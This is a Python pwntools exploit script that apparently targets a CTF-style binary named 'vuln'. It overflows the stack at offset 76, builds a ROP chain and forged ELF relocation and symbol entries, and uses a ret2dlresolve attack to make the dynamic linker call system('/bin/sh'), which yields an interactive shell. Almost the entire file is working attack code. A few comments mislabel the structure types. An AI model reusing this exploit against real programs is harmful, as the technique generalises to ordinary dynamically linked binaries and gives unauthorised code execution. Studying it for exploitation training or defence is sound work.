from pwn import *
import core
import struct
import time
elf = context.binary = ELF('./vuln', checksec=False)
p = elf.process()
#context.log_level = 'debug'

jmprel_address = 0x80482d8 # readelf -d ./vuln | grep "JMPREL"
symtab_address = 0x804820c # readelf -d ./vuln | grep "SYMTAB"
strtab_address = 0x804825c # readelf -d ./vuln | grep "STRTAB"
data_addr = core.get_data_addr(elf) # data for usage

dlpaydata = core.dlresolve_paydata("system", symtab_address, strtab_address, jmprel_address, data_addr)

print("symtab.stname : "+str(hex(dlpaydata.sym_struct.st_name)))
print("jmprel.r_offset : "+str(hex(dlpaydata.rel_struct.r_offset)))
print("jmprel.r_info : "+str(hex(dlpaydata.rel_struct.r_info)))
print("reloc_index : "+str(hex(dlpaydata.reloc_index)))

# dlresolve payload in the DATA_ADDR :

dlresolve_payload = bytearray()
# Write the symbol (system) to Symbol name addr
dlresolve_payload += dlpaydata.symbol_name # "system"+null byte terminator
dlresolve_payload += b"A"*5 # unused data
# SYMTAB (Elf32_Rel)
dlresolve_payload += struct.pack("I", dlpaydata.sym_struct.st_name)
dlresolve_payload += struct.pack("I", 0)*3 # other values of the strucutre
# JMPREL (Elf32_Sym)
dlresolve_payload += struct.pack("I", dlpaydata.rel_struct.r_offset)
dlresolve_payload += struct.pack("I", dlpaydata.rel_struct.r_info)
call_argument_offset = len(dlresolve_payload)
dlresolve_payload += b"/bin/sh" # the argument for system
dlresolve_payload += b"\x00" # null byte terminator

padding = 76 # offset before overwriting EIP
read_plt = 0x08049030
resolver = 0x08049030-16 # plt_init

# ROPchain :
payload = bytearray()
payload += ('A'*padding).encode()
payload += struct.pack("I", read_plt) # read@plt, remember that calling a function in the plt outcomes to calling the function itself
payload += struct.pack("I", 0x0804921a) # ropgadget : pop edi; pop ebp; ret
payload += struct.pack("I", 0x00000000) # args[0] -> Null
payload += struct.pack("I", dlpaydata.DATA_ADDR) # args[1] -> Symbol name address ("system\x00" in payload2)
payload += struct.pack("I", resolver) # [plt_init] system(dlresolve.data_addr+36) so dlresolve.data_addr+36 is the argument that will use system when it will get executed
payload += struct.pack("I", dlpaydata.reloc_index) # reloc index (dlresolve.reloc_index)
payload += ("AAAA").encode() # return address (not important)
payload += struct.pack("I", dlpaydata.DATA_ADDR+call_argument_offset) # args[0] of system which will be written in the second payload (payload2 at "/bin/sh\x00")

p.sendline(payload)
time.sleep(1)
p.sendline(dlresolve_payload)

p.interactive()
